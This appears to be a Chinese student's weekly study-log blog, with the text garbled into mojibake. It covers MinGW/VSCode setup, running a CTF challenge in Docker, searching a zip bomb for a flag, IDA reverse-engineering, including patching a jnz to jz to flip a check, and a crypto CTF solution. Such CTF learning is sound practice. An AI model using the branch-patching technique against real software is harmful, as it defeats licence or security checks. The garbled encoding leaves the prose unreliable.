<h2 id="å®‰è£…mingw"><a href="#å®‰è£…mingw" class="headerlink" title="å®‰è£…mingw"></a>å®‰è£…mingw</h2><p>ç¬‘æ­»ï¼Œä¸€ç›´ä¸‹è½½é”™äº†ã€‚åº”è¯¥æ˜¯è¿™é‡Œçš„å‹ç¼©åŒ…ï¼Œä¹‹å‰ä¸‹è½½çš„å‹ç¼©åŒ…ä¸€ç›´æ˜¯æºç ï¼Œéš¾æ€ªæ‰¾ä¸åˆ°binç›®å½•ã€‚</p>
<blockquote>
<p><a href="https://sourceforge.net/projects/mingw-w64/files/">MinGW-w64 - for 32 and 64 bit Windows - Browse Files at SourceForge.net</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230202101645612-16758393058582.png" class="" title="true download">

<p>æ‰¾åˆ°binç›®å½•ï¼Œå¹¶ä¸”æ”¾å…¥ç¯å¢ƒå˜é‡åï¼Œç›´æ¥è¿è¡Œ<code>gcc -v</code>ï¼Œè®©å®ƒè‡ªå·±è‡ªåŠ¨å®‰è£…ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202102426569.png" class="" title="success">

<p>å®‰è£…æˆåŠŸä¹‹åå°±æ˜¯å‡ºç°è¿™ä¸‹é¢æœ€åä¸€è¡Œã€‚</p>
<h2 id="æŠŠmingwå¯¼å…¥VScodeä¸­"><a href="#æŠŠmingwå¯¼å…¥VScodeä¸­" class="headerlink" title="æŠŠmingwå¯¼å…¥VScodeä¸­"></a>æŠŠmingwå¯¼å…¥VScodeä¸­</h2><p>å…³é”®å‡ ä¸ªæ–‡ä»¶å…·ä½“é…ç½®ä¸å¤ªç†è§£å…·ä½“ä½œç”¨ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202130051892.png" class="" title="gcc.exe">

<p><code>c_cpp_properties.json</code>ï¼Œè¿è¡Œåº”è¯¥æ˜¯è‡ªåŠ¨æ£€æµ‹ç›¸å…³è·¯å¾„ç„¶åè¿›è¡Œå¯¼å…¥ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202130636843.png" class="" title="image-20230202130636843">

<p><code>task.json</code>ç”¨æ¥åšç¼–è¯‘ã€‚</p>
<p><code>launch.json</code>æ‰§è¡Œç¼–è¯‘å¥½çš„æ–‡ä»¶ã€‚</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/394595507">è¯¦è§£Linuxä¸‹ä½¿ç”¨vscodeç¼–è¯‘è¿è¡Œå’Œè°ƒè¯•C&#x2F;C++ - çŸ¥ä¹ (zhihu.com)</a></p>
</blockquote>
<h3 id="create-task-json"><a href="#create-task-json" class="headerlink" title="create task.json"></a>create task.json</h3><p>é€‰æ‹© <strong>Terminal</strong>&gt;<strong>Configure Default Build Task</strong> ï¼Œå°†å‡ºç°ä¸€ä¸ªä¸‹æ‹‰èœå•ï¼Œæ˜¾ç¤º C++ ç¼–è¯‘å™¨çš„å„ç§é¢„å®šä¹‰ç¼–è¯‘ä»»åŠ¡ã€‚é€‰æ‹© <strong>C&#x2F;C++: g++ build active file</strong>ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># task.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: g++.exe build active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\x86_64-8.1.0-release-win32-seh-rt_v6-rev0\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">				<span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">			<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">				<span class="string">&quot;$gcc&quot;</span></span><br><span class="line">			<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;compiler: D:\\x86_64-8.1.0-release-win32-seh-rt_v6-rev0\\mingw64\\bin\\g++.exe&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>command:</strong> è¦è¿è¡Œçš„ç¨‹åºï¼Œæ­¤å¤„æ˜¯g++ã€‚</p>
<p><strong>args</strong>ï¼š args æ•°ç»„åŒ…å«å°†ä¼ é€’ç»™ g++ çš„å‘½ä»¤è¡Œå‚æ•°ï¼ˆå¿…é¡»æŒ‰ç…§ç¼–è¯‘å™¨é¢„æœŸçš„é¡ºåºæŒ‡å®šï¼‰ã€‚<code>$&#123;file&#125;</code>è¡¨ç¤ºå½“å‰æ‰“å¼€çš„å¾…ç¼–è¯‘çš„æ´»åŠ¨æ–‡ä»¶ï¼Œå¯¹å®ƒè¿›è¡Œç¼–è¯‘ï¼Œå¹¶åœ¨å½“å‰è·¯å¾„<code>$&#123;fileDirname&#125;</code>ç”Ÿæˆä¸æ´»åŠ¨æ–‡ä»¶åŒåæ— åç¼€çš„å¯æ‰§è¡Œæ–‡ä»¶<code>$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;</code>ã€‚åœ¨æœ¬æ¡ˆä¾‹ä¸­æ´»åŠ¨æ–‡ä»¶æŒ‡helloworld.cpp,æ‰€ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸ºhelloworldã€‚</p>
<p><strong>label:</strong> æ ‡ç­¾å€¼æ˜¯å°†åœ¨ä»»åŠ¡åˆ—è¡¨ä¸­çœ‹åˆ°çš„å†…å®¹ï¼›å¯ä»¥éšæ„å‘½åå®ƒã€‚</p>
<p>groupä¸­çš„<strong>isDefault</strong>: å€¼ä¸º<strong>true</strong>è¡¨ç¤ºæ”¯æŒé€šè¿‡å¿«æ·é”®ctrl+shift+Bæ¥æ‰§è¡Œè¯¥ç¼–è¯‘ä»»åŠ¡ã€‚å¦‚æœå€¼æ”¹ä¸ºfalseï¼Œä¹Ÿå¯ä»¥ä»èœå•ä¸­é€‰æ‹©è¿è¡Œï¼š<strong>Terminal</strong>&gt;<strong>Run Build Taskã€‚</strong></p>
<blockquote>
<p>æ’ä¸€å¥ï¼šæˆ‘å»ï¼Œæˆ‘æ˜¯çœŸçš„éƒ½æŠŠCè¯­è¨€çš„ç›¸å…³ç»™æ•´å¿˜äº†ï¼Œæˆ‘éƒ½å‹æ ¹æ²¡æœ‰å…ˆç¼–è¯‘ï¼Œæˆ‘çš„å¤©ã€‚</p>
</blockquote>
<h3 id="run-task-json"><a href="#run-task-json" class="headerlink" title="run task.json"></a>run task.json</h3><p>æ‰§è¡Œtasks.jsonä¸­å®šä¹‰çš„ç¼–è¯‘ä»»åŠ¡ã€‚å¿«æ·é”®ctrl+shift+Bæˆ–è€…ä»èœå•ä¸­é€‰æ‹©è¿è¡Œï¼š<strong>Terminal&gt;Run Build Task</strong>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202133848145.png" class="" title="run task.json">

<p>åº”è¯¥è¿™ä¸ªæ‰æ˜¯æˆåŠŸå§ï¼Œç˜«ã€‚ä¹‹å‰çš„å¯èƒ½ç«¯å£ç¡®å®è¢«å ç”¨äº†ã€‚</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/272216929">ã€VSCodeã€‘è§£å†³â€œç»ˆç«¯å°†è¢«ä»»åŠ¡é‡ç”¨ï¼ŒæŒ‰ä»»æ„é”®å…³é—­â€é—®é¢˜ - çŸ¥ä¹ (zhihu.com)</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230202135137189.png" class="" title="image-20230202135137189">

<p>ç„¶åæ–°å¼€ä¸€ä¸ªterminalçª—å£ï¼Œè¿›å…¥</p>
<h3 id="create-launch-json"><a href="#create-launch-json" class="headerlink" title="create launch.json"></a>create launch.json</h3><p><code>launch.json</code>æ–‡ä»¶ç”¨äºåœ¨ Visual Studio Code ä¸­é…ç½®è°ƒè¯•å™¨ã€‚æ¥ä¸‹æ¥å°†åˆ›å»º<code>launch.json</code> æ–‡ä»¶ã€‚</p>
<p>é€‰æ‹© **Run &gt; Add Configurationâ€¦<strong>ï¼Œé€‰æ‹©</strong>C++ (GDB&#x2F;LLDB)**ã€‚ ä¹‹åå°†çœ‹åˆ°å±•ç¤ºå„ç§é¢„å®šä¹‰è°ƒè¯•é…ç½®çš„ä¸‹æ‹‰åˆ—è¡¨ï¼Œé€‰æ‹© <strong>g++ build and debug active file</strong>ã€‚å°†è‡ªåŠ¨ç”Ÿæˆ<code>launch.json</code>æ–‡ä»¶ã€‚</p>
<blockquote>
<p>ä½†æˆ‘æ²¡æ‰¾åˆ°ã€‚</p>
</blockquote>
<p>è™½ç„¶æ²¡æ‰¾åˆ°ï¼Œä½†è«åå…¶å¦™èƒ½è¿è¡Œäº†ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202164724447.png" class="" title="C&amp;C++">

<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è°ƒè¯•é€»è¾‘æœ‰ç‚¹è®©äººæ‘¸ä¸ç€å¤´è„‘ã€‚</p>
<p>ä½†èƒ½è¿è¡Œå°±æš‚ä¸”å…ˆä¸æ•´å•¥ä¸œè¥¿ã€‚</p>
<h1 id="230203"><a href="#230203" class="headerlink" title="230203"></a>230203</h1><p>å˜ç§2&#x2F;3ï¼Œæ”¾230201äº†ã€‚</p>
<h1 id="230206"><a href="#230206" class="headerlink" title="230206"></a>230206</h1><h2 id="å…³äºå¦‚ä½•è¿è¡Œå·²ä¸Šä¼ dockerhubä¸­çš„ç¯å¢ƒ"><a href="#å…³äºå¦‚ä½•è¿è¡Œå·²ä¸Šä¼ dockerhubä¸­çš„ç¯å¢ƒ" class="headerlink" title="å…³äºå¦‚ä½•è¿è¡Œå·²ä¸Šä¼ dockerhubä¸­çš„ç¯å¢ƒ"></a>å…³äºå¦‚ä½•è¿è¡Œå·²ä¸Šä¼ dockerhubä¸­çš„ç¯å¢ƒ</h2><blockquote>
<p><a href="https://blog.csdn.net/m0_51295655/article/details/128198412">(10æ¡æ¶ˆæ¯) (ä¸‰) Dockerå¸¸ç”¨å‘½ä»¤_docker run è¿›å…¥å·²å‘½åçš„å®¹å™¨_å°æ€ªå–çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<h3 id="æ‹‰å–é•œåƒ"><a href="#æ‹‰å–é•œåƒ" class="headerlink" title="æ‹‰å–é•œåƒ"></a>æ‹‰å–é•œåƒ</h3><p>è¿›å…¥è¶…çº§ç®¡ç†æ¨¡å¼ã€‚</p>
<ul>
<li><code>docker pull dockerhubè´¦å·/dockerhubä»“åº“åç§°:dockerhubæ ‡ç­¾å</code></li>
</ul>
<p>ä»¥<a href="https://github.com/CTF-Archives/2022-xhlj-crypto-lockbylock">GitHub - CTF-Archives&#x2F;2022-xhlj-crypto-lockbylock: A crypto challenge in 2022 è¥¿æ¹–è®ºå‰‘å¤§èµ›</a>è¯¥é¢˜ä¸Šä¼ ç¯å¢ƒä¸ºä¾‹ã€‚</p>
<p><code>docker pull randark/2022-xhlj-crypto-lockbylock:master</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230206102900410.png" class="" title="pullé•œåƒ">

<h3 id="æ‹‰å–æˆåŠŸ"><a href="#æ‹‰å–æˆåŠŸ" class="headerlink" title="æ‹‰å–æˆåŠŸ"></a>æ‹‰å–æˆåŠŸ</h3><ul>
<li><code>docker images</code></li>
</ul>
<p>æŸ¥çœ‹æ‹‰å–åçš„é•œåƒã€‚æ‹‰å–æˆåŠŸã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206103136983.png" class="" title="success">

<h3 id="è¿è¡Œæ‹‰å–çš„é•œåƒ"><a href="#è¿è¡Œæ‹‰å–çš„é•œåƒ" class="headerlink" title="è¿è¡Œæ‹‰å–çš„é•œåƒ"></a>è¿è¡Œæ‹‰å–çš„é•œåƒ</h3><ul>
<li><code>docker run -tid -p xxxx:80 imageid</code> </li>
<li><em>docker run -tid -P xxxx:80 imageid</em></li>
</ul>
<p>â€¦â€¦æ²¡æˆåŠŸï¼Œå’‹å›äº‹ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206105701169.png" class="" title="image-20230206105701169">

<p>å¥½åƒæ˜¯æˆåŠŸçš„ï¼Œä½†æˆ‘ä»¥ä¸ºæ²¡æˆåŠŸã€‚</p>
<ul>
<li><code>docker run -it repository:tag</code></li>
</ul>
<p>åœæ»å…¶ä¸­ã€‚</p>
<ul>
<li><code>docker run -it -d --name name -p port:port -v path:path -v file:file -e env=value image:tag /bin/bash </code></li>
</ul>
<p>ä¼¼ä¹æ˜¯å®Œæ•´å‘½ä»¤ã€‚</p>
<h3 id="æŸ¥çœ‹è¿è¡Œä¸­çš„ç¨‹åº"><a href="#æŸ¥çœ‹è¿è¡Œä¸­çš„ç¨‹åº" class="headerlink" title="æŸ¥çœ‹è¿è¡Œä¸­çš„ç¨‹åº"></a>æŸ¥çœ‹è¿è¡Œä¸­çš„ç¨‹åº</h3><ul>
<li><code>docker ps</code></li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230206105925190.png" class="" title="image-20230206105925190">

<hr>
<p>è¿˜æ²¡æ³•ç”¨ncè¿æ¥ï¼Œè¿·èŒ«ä¸­ã€‚</p>
<h2 id="sagemathä¸­æ–‡æ–‡æ¡£ä»¥åŠå›¾å½¢åŒ–ç­‰åŠŸèƒ½"><a href="#sagemathä¸­æ–‡æ–‡æ¡£ä»¥åŠå›¾å½¢åŒ–ç­‰åŠŸèƒ½" class="headerlink" title="sagemathä¸­æ–‡æ–‡æ¡£ä»¥åŠå›¾å½¢åŒ–ç­‰åŠŸèƒ½"></a>sagemathä¸­æ–‡æ–‡æ¡£ä»¥åŠå›¾å½¢åŒ–ç­‰åŠŸèƒ½</h2><blockquote>
<p>[ç»˜å›¾ <a href="https://www.lainme.com/doku.php/topic/sage/chapter_02/section_05">Lainmeâ€™s Blog]</a></p>
</blockquote>
<h2 id="å‹ç¼©åŒ…ç‚¸å¼¹-Zipbomb"><a href="#å‹ç¼©åŒ…ç‚¸å¼¹-Zipbomb" class="headerlink" title="å‹ç¼©åŒ…ç‚¸å¼¹(Zipbomb)"></a>å‹ç¼©åŒ…ç‚¸å¼¹(Zipbomb)</h2><blockquote>
<p>å¤§å‹ç¼©æ–‡ä»¶ï¼Œå æ®å¤§é‡å†…å­˜ã€‚</p>
</blockquote>
<h3 id="åˆ©ç”¨è„šæœ¬å¯¹å¤§å‹ç¼©æ–‡ä»¶è¿›è¡Œæ£€ç´¢"><a href="#åˆ©ç”¨è„šæœ¬å¯¹å¤§å‹ç¼©æ–‡ä»¶è¿›è¡Œæ£€ç´¢" class="headerlink" title="åˆ©ç”¨è„šæœ¬å¯¹å¤§å‹ç¼©æ–‡ä»¶è¿›è¡Œæ£€ç´¢"></a>åˆ©ç”¨è„šæœ¬å¯¹å¤§å‹ç¼©æ–‡ä»¶è¿›è¡Œæ£€ç´¢</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dir_path=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">files= os.listdir(dir_path)</span><br><span class="line">newfiles = [<span class="string">&quot;zipboom.zip&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(newfiles)</span><br><span class="line">setee = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> newfiles: <span class="comment">#éå†æ–‡ä»¶å¤¹</span></span><br><span class="line">    position = dir_path+<span class="string">&#x27;\\&#x27;</span>+ file <span class="comment">#æ„é€ ç»å¯¹è·¯å¾„ï¼Œ&quot;\\&quot;ï¼Œå…¶ä¸­ä¸€ä¸ª&#x27;\&#x27;ä¸ºè½¬ä¹‰ç¬¦</span></span><br><span class="line">    <span class="built_in">print</span> (position)</span><br><span class="line">    z = zipfile.ZipFile(position, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> z.namelist():</span><br><span class="line">        <span class="built_in">bytes</span> = z.read(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œåå¾—åˆ°å¤§å‹ç¼©æ–‡ä»¶å†…å«<code>AAAA</code>æ–‡ä»¶ã€‚</p>
<h3 id="æå–å†…å«æ–‡ä»¶çš„å°å‹ç¼©åŒ…"><a href="#æå–å†…å«æ–‡ä»¶çš„å°å‹ç¼©åŒ…" class="headerlink" title="æå–å†…å«æ–‡ä»¶çš„å°å‹ç¼©åŒ…"></a>æå–å†…å«æ–‡ä»¶çš„å°å‹ç¼©åŒ…</h3><p>åˆ©ç”¨<code>winhex</code>æˆ–<code>010editor</code>è¿›è¡Œæå–ï¼Œæå–å®Œç›´æ¥è§£å‹å³å¯ã€‚</p>
<h3 id="ç®€å•ç›´æ¥çš„æ–¹æ³•"><a href="#ç®€å•ç›´æ¥çš„æ–¹æ³•" class="headerlink" title="ç®€å•ç›´æ¥çš„æ–¹æ³•"></a>ç®€å•ç›´æ¥çš„æ–¹æ³•</h3><p><code>winrar</code>ç›´æ¥å°±æ£€ç´¢åˆ°æœ‰æ•ˆæ–‡ä»¶<code>AAAA</code>ï¼Œç›´æ¥è§£å‹å°±å¯ä»¥äº†ã€‚</p>
<h2 id="re-easyre"><a href="#re-easyre" class="headerlink" title="re-easyre"></a>re-easyre</h2><h3 id="exeinfoæŸ¥çœ‹æ˜¯å¦åŠ å£³"><a href="#exeinfoæŸ¥çœ‹æ˜¯å¦åŠ å£³" class="headerlink" title="exeinfoæŸ¥çœ‹æ˜¯å¦åŠ å£³"></a>exeinfoæŸ¥çœ‹æ˜¯å¦åŠ å£³</h3><img src="/2023/12/31/WeeklyStudy/image-20230206150242712.png" class="" title="image-20230206150242712">

<p>å¾—åˆ°å…³é”®ä¿¡æ¯ï¼š</p>
<ul>
<li>64ä½ç¨‹åº</li>
<li>not packedå³æœªåŠ å£³</li>
</ul>
<h3 id="æ”¾å…¥ida-64è¿›è¡Œåˆ†æ"><a href="#æ”¾å…¥ida-64è¿›è¡Œåˆ†æ" class="headerlink" title="æ”¾å…¥ida-64è¿›è¡Œåˆ†æ"></a>æ”¾å…¥ida-64è¿›è¡Œåˆ†æ</h3><p>æ‰¾åˆ°mainå‡½æ•°çš„å…¥å£ï¼Œæˆ‘åœ¨è¿™é‡Œçš„è¯æ˜¯å…ˆçœ‹exportsæ¨¡å—ä¸­çš„è¿›è¡ŒæŸ¥çœ‹ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206150453561.png" class="" title="image-20230206150453561">

<p>æ‰¾åˆ°å…·ä½“ä½ç½®åï¼Œç¨å¾®æŸ¥çœ‹ä¸€ä¸‹å°±ç›´æ¥æ‰¾åˆ°flagäº†ã€‚</p>
<p>ã€å®šä½ä¹‹åå‘ç°åº”è¯¥å°±æ˜¯æŠŠç¨‹åºæ‹–å…¥idaä¹‹åç›´æ¥è·³è½¬åˆ°çš„ç•Œé¢ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206150138211.png" class="" title="image-20230206150138211">

<h2 id="re-reverse1"><a href="#re-reverse1" class="headerlink" title="re-reverse1"></a>re-reverse1</h2><p>å‰é¢ä¸€æ ·çš„æ­¥éª¤ã€‚</p>
<p>å¾—åˆ°ä¿¡æ¯ï¼š</p>
<ul>
<li>64ä½ç¨‹åºæ–‡ä»¶</li>
<li>æœªåŠ å£³</li>
</ul>
<p>å…ˆæŸ¥çœ‹stringçª—å£ï¼Œå‘ç°ç–‘ä¼¼flagï¼Œè¿›è¡Œè·³è½¬ã€‚</p>
<p>è·³è½¬å®Œéœ€è¦è¿›è¡Œåˆ†æï¼Œåˆ†æå®Œå‘ç°ç›´æ¥æäº¤<code>flag&#123;hello_world&#125;</code>æ˜¯é”™è¯¯çš„ã€‚</p>
<p>ç»§ç»­å½“å‰ä»£ç æ®µè¿›è¡Œåˆ†æï¼Œå‘ç°å¯¹å­—ç¬¦è¿›è¡Œäº†ä¸€äº›å¤„ç†ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206163323825.png" class="" title="image-20230206163323825">

<img src="/2023/12/31/WeeklyStudy/image-20230206163430292.png" class="" title="image-20230206163430292">

<h2 id="IDAçš„å­¦ä¹ ä½¿ç”¨"><a href="#IDAçš„å­¦ä¹ ä½¿ç”¨" class="headerlink" title="IDAçš„å­¦ä¹ ä½¿ç”¨"></a>IDAçš„å­¦ä¹ ä½¿ç”¨</h2><h3 id="å›¾å½¢ç•Œé¢-x2F-æµç¨‹å›¾ç•Œé¢"><a href="#å›¾å½¢ç•Œé¢-x2F-æµç¨‹å›¾ç•Œé¢" class="headerlink" title="å›¾å½¢ç•Œé¢&#x2F;æµç¨‹å›¾ç•Œé¢"></a>å›¾å½¢ç•Œé¢&#x2F;æµç¨‹å›¾ç•Œé¢</h3><p>Yesè¾¹çš„ç®­å¤´ï¼ˆæ˜¯çš„ï¼Œæ‰§è¡Œåˆ†æ”¯ï¼‰é»˜è®¤ä¸ºç»¿è‰²ï¼ŒNoè¾¹çš„ç®­å¤´ï¼ˆä¸ï¼Œä¸æ‰§è¡Œåˆ†æ”¯ï¼‰é»˜è®¤ä¸ºçº¢è‰²ã€‚</p>
<h3 id="å¦‚ä½•åŸºäºIDAå¯¹ç›¸å…³è·³è½¬è¿›è¡Œä¿®æ”¹"><a href="#å¦‚ä½•åŸºäºIDAå¯¹ç›¸å…³è·³è½¬è¿›è¡Œä¿®æ”¹" class="headerlink" title="å¦‚ä½•åŸºäºIDAå¯¹ç›¸å…³è·³è½¬è¿›è¡Œä¿®æ”¹"></a>å¦‚ä½•åŸºäºIDAå¯¹ç›¸å…³è·³è½¬è¿›è¡Œä¿®æ”¹</h3><p>eg: jnz -&gt; jz</p>
<p>åˆ©ç”¨16è¿›åˆ¶è¿›è¡Œä¿®æ”¹ï¼Œjnzå¯¹åº”çš„16è¿›åˆ¶ä¸º75ï¼Œè€Œjzå¯¹åº”çš„16è¿›åˆ¶ä¸º74ï¼Œå¯¹åº”åˆ°16è¿›åˆ¶ç•Œé¢ï¼Œç„¶åå³é”®<code>edit</code>ï¼Œä¿®æ”¹å®Œç»§ç»­<code>apply change</code>ã€‚</p>
<h3 id="ä¿®æ”¹å®Œç›¸åº”ä»£ç ç‰‡æ®µï¼Œä¿å­˜ä¸ºæ‰§è¡Œæ–‡ä»¶"><a href="#ä¿®æ”¹å®Œç›¸åº”ä»£ç ç‰‡æ®µï¼Œä¿å­˜ä¸ºæ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä¿®æ”¹å®Œç›¸åº”ä»£ç ç‰‡æ®µï¼Œä¿å­˜ä¸ºæ‰§è¡Œæ–‡ä»¶"></a>ä¿®æ”¹å®Œç›¸åº”ä»£ç ç‰‡æ®µï¼Œä¿å­˜ä¸ºæ‰§è¡Œæ–‡ä»¶</h3><p><code>Edit</code> -&gt; <code>Patch program</code> -&gt; <code>Apply patches to input file</code></p>
<h1 id="230207"><a href="#230207" class="headerlink" title="230207"></a>230207</h1><h2 id="å†æ¢å¼ºç½‘æ‹Ÿæ€å¯†ç å­¦cry1"><a href="#å†æ¢å¼ºç½‘æ‹Ÿæ€å¯†ç å­¦cry1" class="headerlink" title="å†æ¢å¼ºç½‘æ‹Ÿæ€å¯†ç å­¦cry1"></a>å†æ¢å¼ºç½‘æ‹Ÿæ€å¯†ç å­¦cry1</h2><p>é‡æ–°åˆçœ‹äº†ä¸€ä¸‹è¿™é“é¢˜ï¼Œæ„Ÿè§‰æ²¡å¿…è¦åˆ©ç”¨åŸæœ‰çš„åŠ å¯†å‡½æ•°è¿›è¡Œè§£å¯†å†è¿›è¡Œæ“ä½œã€‚</p>
<p>ä¸»è¦æŠŠflagåˆ†æˆäº†ä¸¤éƒ¨åˆ†ï¼Œè€Œç¬¬ä¸€éƒ¨åˆ†ç”¨ç®€å•æ•°å­¦æ¨å¯¼ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æŠŠç›¸å…³é‡ç»™æ±‚è§£å‡ºæ¥ã€‚</p>
<h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><blockquote>
<p>åŸï¼šåˆ©ç”¨æºä»£ç ä¸­çš„åŠ å¯†é€†å‘å†™è§£å¯†ç®—æ³•ï¼Œä¸­å›½å‰©ä½™å®šç†</p>
<p>ç°ï¼šè´¹é©¬å°å®šç†è¿›è¡Œæ•°å­¦æ¨å¯¼</p>
</blockquote>
<p>å·²çŸ¥ï¼š<br>$$<br>g_1 &#x3D; g^{(p-1) \cdot r_1}\mod p<br>$$</p>
<p>$$<br>c_1 \equiv (m \times g_1^{s_1} \mod N )\mod N<br>$$</p>
<p>æ¨å¯¼ï¼šä¸»è¦åˆ©ç”¨<strong>è´¹é©¬å°å®šç†</strong>ã€‚<br>$$<br>g_1 &#x3D; g^{(p-1)\cdot r1} \mod p \equiv 1<br>$$</p>
<p>$$<br>\Longrightarrow g_1 - 1 &#x3D; k\cdot p<br>$$</p>
<p>è€Œ$N &#x3D; p \times q$ï¼Œæ‰€ä»¥æ­¤æ—¶ï¼Œ$p &#x3D; gcd(g_1 - 1, N)$<br>$$<br>c_1 \equiv (m \times g^{s_1 \cdot r_1  \cdot (p-1)} \mod p) \mod N\<br>\Longrightarrow c_1 \equiv m \mod N<br>$$<br>æ‰€ä»¥ï¼Œç†è®ºä¸Š$m \equiv c_1 \mod N$ï¼Œä½†$N$èŒƒå›´å¤ªå¤§äº†ï¼ŒåŸºäº$m$çš„é•¿åº¦ä¸ä¼šå¤ªå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›è¡Œæ”¾ç¼©å¤„ç†ï¼Œå–$min (m \equiv c_1 \mod p, m\equiv c_1 \mod q)$.</p>
<p>æœ€åæ¨æ–­å‡ºï¼Œå®é™…ä¸Šçš„$m$åº”ä¸º$c_1 \mod p$ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = gcd(g1-<span class="number">1</span>, N)</span><br><span class="line">q1 = N // p1</span><br><span class="line">m = c1 % p1</span><br></pre></td></tr></table></figure>



<h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><blockquote>
<p>åŸï¼šGroebner basisç›¸å…³çŸ¥è¯†ç‚¹ã€è¿˜æ²¡ææ‡‚ã€‚</p>
<p>ç°ï¼šè½¬æ¢æˆä¸‰å…ƒäºŒæ¬¡æ–¹ç¨‹è¿›è¡Œæ±‚è§£</p>
</blockquote>
<p>å…ˆå¼€$e$æ¬¡æ–¹æ±‚å‡ºå…³äº$ABC$çš„äºŒæ¬¡æ–¹ç¨‹ã€‚å†ç”¨<code>roots()</code>è¿›è¡Œç›¸åº”çš„æ±‚è§£ã€‚</p>
<ul>
<li>é¢˜ç›®ä¸­çš„$ABC$æ–¹ç¨‹ä¿æŒä¸å˜</li>
</ul>
